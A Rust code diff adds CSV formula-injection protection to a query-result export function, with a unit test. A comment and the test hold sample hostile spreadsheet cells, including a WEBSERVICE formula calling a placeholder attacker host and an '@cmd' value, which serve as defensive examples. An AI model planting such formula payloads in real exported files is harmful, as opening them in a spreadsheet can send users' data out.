@@ -33,6 +33,23 @@ fn cell_to_csv_string(value: &serde_json::Value) -> String {
     }
 }
 
+/// Prefixes spreadsheet-formula-looking cells so opening the export in Excel
+/// or LibreOffice cannot execute them (`=WEBSERVICE("http://attacker/")`).
+/// Numeric values that merely start with `+`/`-` are left untouched.
+fn neutralize_formula(field: &str) -> String {
+    let trimmed = field.trim_start();
+    let risky = match trimmed.chars().next() {
+        Some('=') | Some('@') => true,
+        Some('+') | Some('-') => trimmed[1..].trim().parse::<f64>().is_err(),
+        _ => false,
+    };
+    if risky {
+        format!("'{field}")
+    } else {
+        field.to_string()
+    }
+}
+
 fn escape_csv_field(field: &str) -> String {
     if field.contains(',') || field.contains('"') || field.contains('\r') || field.contains('\n') {
         format!("\"{}\"", field.replace('"', "\"\""))
@@ -54,7 +71,7 @@ fn export_csv(result: &QueryResult, path: &Path) -> Result<usize, String> {
         let cells = normalize_row(row, col_count);
         let line = cells
             .iter()
-            .map(|cell| escape_csv_field(&cell_to_csv_string(cell)))
+            .map(|cell| escape_csv_field(&neutralize_formula(&cell_to_csv_string(cell))))
             .collect::<Vec<_>>()
             .join(",");
         lines.push(line);
@@ -126,4 +143,18 @@ mod tests {
         let err = write_result(&result, &txt_path).unwrap_err();
         assert_eq!(err, "unsupported export format; use a .csv or .json path");
     }
+}
+
+#[test]
+fn formula_like_cells_are_neutralized_numbers_are_not() {
+    assert_eq!(
+        neutralize_formula("=WEBSERVICE(\"http://x/\")"),
+        "'=WEBSERVICE(\"http://x/\")"
+    );
+    assert_eq!(neutralize_formula("@cmd arg"), "'@cmd arg");
+    assert_eq!(neutralize_formula("-5"), "-5");
+    assert_eq!(neutralize_formula("+42"), "+42");
+    assert_eq!(neutralize_formula("-3.14e2"), "-3.14e2");
+    assert_eq!(neutralize_formula("plain text"), "plain text");
+    assert_eq!(neutralize_formula(""), "");
 }
